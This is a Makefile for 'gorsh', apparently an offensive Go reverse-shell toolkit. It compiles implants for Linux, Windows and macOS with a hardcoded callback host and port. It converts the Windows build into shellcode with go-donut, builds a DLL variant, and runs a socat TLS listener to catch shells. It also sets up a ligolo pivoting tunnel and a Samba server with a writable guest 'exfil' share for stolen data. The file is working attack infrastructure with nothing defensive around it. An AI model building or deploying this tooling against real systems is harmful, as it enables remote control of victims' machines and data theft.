##############
# CONFIGURATION
##############
# used for artifact naming
APP = gorsh
# artifact output directory
OUT = /srv/smb/tools
# build command prefix
BUILD = go build -trimpath
# operation systems to build for
PLATFORMS = linux windows darwin
# host the reverse shell will call back to
LHOST ?= 10.10.14.21
# port the reverse shell will call back to
LPORT ?= 8443
# exfil and staging path to serve over smb
TOOLS ?= /srv/smb/tools
EXFIL ?= /srv/smb/exfil


##############
# ADVANCED
# CONFIGURATION
##############
# sets mingw for dll target when not windows
ifneq ($(UNAME), Windows)
	DLLCC=x86_64-w64-mingw32-gcc
endif
# embeds paramaters
LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
# references the calling target withing each block
target = $(word 1, $@)


##############
# MAKE TARGETS
##############
all: $(PLATFORMS) shellcode dll

${PLATFORMS}: $(SRV_KEY) $(GARBLE)
	GOOS=${target} ${BUILD} \
		-buildmode pie \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/${APP}.${target} \
		cmd/gorsh/main.go

listen: $(SRV_KEY) $(SOCAT)
	@test -n "$(PORT)" || (echo "PORT not defined"; exit 1)
	${SOCAT} -d \
		OPENSSL-LISTEN:${LPORT},fork,key=${SRV_KEY},cert=${SRV_PEM},reuseaddr,verify=0 \
		EXEC:scripts/${target}.sh

		# EXEC:scripts/${target}.sh

shellcode: $(GODONUT) windows
	${GODONUT} --arch x64 --verbose \
		--in ${OUT}/${APP}.windows \
		--out ${OUT}/${APP}.windows.bin 

dll:
	CGO_ENABLED=1 CC=${DLLCC} \
	GOOS=windows ${BUILD} \
		-buildmode=c-shared \
		-trimpath \
		${ZSTD.windows} \
		-ldflags ${LDFLAGS} \
		-o ${OUT}/${APP}.windows.dll \
		cmd/gorsh-dll/dllmain.go

##############
# LIGOLO MGMT
##############
ligolo-start:
	ip tuntap add user player1 ligolo mode tun
	ip link add br0 type bridge
	$(LIGOLO) -selfcert

##############
# CIFS MGMNT
##############
export DOCKERSMB SMBCONF
smbstart:
	@echo "$$DOCKERSMB" > docker-compose.yml
	@echo "$$SMBCONF" > .docker/data/config.yml
	docker-compose up -d --force-recreate

smbstop:
	docker stop samba

smblogs:
	docker logs -f samba | grep 'connect\|numopen'


clean:
	rm -rf ${OUT} certs/*


##############
# DEPENDENCY
# MANAGEMENT
##############

LIGOLO = ${GOPATH}/bin/ligolo
GODONUT = ${GOPATH}/bin/go-donut
GARBLE = ${GOPATH}/bin/garble
SOCAT = $(shell which socat)

# TLS cert targets
SRV_KEY = certs/server.key
SRV_PEM = certs/server.pem
FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)

$(LIGOLO):
	go install github.com/tnpitsecurity/ligolo-ng@latest

$(GODONUT):
	go install github.com/Binject/go-donut@latest

$(GARBLE):
	go install mvdan.cc/garble@latest

$(SOCAT):
	sudo apt get install socat

$(SRV_KEY) $(SRV_PEM) &:
	mkdir -p certs
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}



##############
# TEMPLATE
# DEFINITIONS
##############

define DOCKERSMB
version: "3.5"
services:
 samba:
  image: crazymax/samba
  container_name: samba
  environment:
   SAMBA_LOG_LEVEL: 2
  ports:
   - "445:445"
  volumes:
   - "./.docker/data:/data"
   - "${EXFIL}:/samba/exfil"
   - "${TOOLS}:/samba/tools"
  restart: always
endef

define SMBCONF
auth:
  - user: foo
    group: foo
    uid: 1000
    gid: 1000
    password: bar
global:
  - "force user = foo"
  - "force group = foo"
share:
  - name: e
    path: /samba/exfil
    browsable: no
    readonly: no
    guestok: yes

  - name: t
    path: /samba/tools
    browsable: yes
    readonly: yes
    guestok: yes
endef

.PHONY: clean smblogs smbstop smbstart ligolo-start dll shellcode listen shellcode $(PLATFORMS) all
